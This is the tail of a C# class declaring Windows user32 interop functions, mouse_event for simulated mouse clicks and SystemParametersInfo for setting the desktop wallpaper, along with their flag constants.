        [DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const int MOUSEEVENTF_LEFTUP = 0x0004;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const int MOUSEEVENTF_RIGHTUP = 0x0010;

        [DllImport("user32.dll")]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;
    }
}